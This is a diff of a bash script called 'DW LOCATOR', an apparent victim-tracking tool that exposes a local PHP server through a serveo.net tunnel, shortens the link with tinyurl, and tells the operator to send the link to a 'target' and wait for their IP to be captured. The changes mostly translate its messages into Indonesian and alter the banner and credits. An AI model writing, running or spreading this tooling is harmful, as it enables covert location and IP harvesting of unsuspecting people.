@@ -1,8 +1,7 @@
 #!/bin/bash
-# DW LOCATOR v1.1
-# DW SQUAD
-# Github: https://github.com/19245/DWLOCATOR
-
+# DW LOCATOR v1.0
+# Coded by: DW SQUAD (You dont become a coder by just changing the credits)
+# Github: https://github.com/19245/DW LOCATOR
 
 trap 'printf "\n";stop;exit 1' 2
 
@@ -226,11 +225,11 @@ getcredentials
 
 ##
 serverx() {
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] Memilulai server php...\n"
 php -t "server/" -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Server dimulai...\e[0m\n"
+command -v ssh > /dev/null 2>&1 || { echo >&2 "tools ini membutuhkan ssh silahkan ketik pkg install openssh."; exit 1; }
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -239,9 +238,9 @@ printf "\n"
 sleep 4 # &
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Kirim link atau web ini ke target:\e[0m\e[1;77m %s \n' $send_link
 send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link)
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Kalau eror bisa gunakan web ini:\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
 checkfound
 
@@ -359,12 +358,12 @@ fi
 checkfound() {
 
 printf "\n"
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting target open the link ...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Menunggu target membuka link ...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "server/ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
+printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Ditemukan!\n"
 catch_ip
 
 fi
@@ -375,15 +374,15 @@ done
 
 banner() {
 
-printf "\e[1;93m  _______  ____    __    ____         _______  ______      __    __       ___       _______      \e[0m\n"
-printf "\e[1;93m  |       \ \   \  /  \  /   /        /       | /  __  \    |  |  |  |     /   \     |       \   \e[0m\n"
-printf "\e[1;77m  |  .--.  | \   \/    \/   /        |   (----`|  |  |  |   |  |  |  |    /  ^  \    |  .--.  |  \e[0m\n"
-printf "\e[1;77m  |  |  |  |  \            /          \   \    |  |  |  |   |  |  |  |   /  /_\  \   |  |  |  |  \e[0m\n"
-printf "\e[1;77m  |  '--'  |   \    /\    /       .----)   |   |  `--'  '--.|  `--'  |  /  _____  \  |  '--'  |  \e[0m\n"
-printf "\e[1;77m  |_______/     \__/  \__/        |_______/     \_____\_____\\______/  /__/     \__\ |_______/   \e[0m\n"
+printf "\e[1;93m  _                                                \e[0m\n"
+printf "\e[1;93m //   ____  _                              \e[0m\e[1;77m_                 \e[0m\n"
+printf "\e[1;77m //  /  _ \/ \  /|  \e[0m\n"
+printf "\e[1;77m //  | | \|| |  || \e[0m\n"
+printf "\e[1;77m //  | |_/|| |/\||     \e[0m\n"
+printf "\e[1;77m //  \____/\_/  \| LOCATOR    v1.1 \e[0m\n"
 printf "\n"
-printf "\e[1;93m :::\e[0m\e[1;77m DW SQUAD TEAM\e[0m\n"
- 
+printf "\e[1;93m :::\e[0m\e[1;77m Coded by: DW SQUAD\e[0m\n"
+
 }
 banner
 dependencies
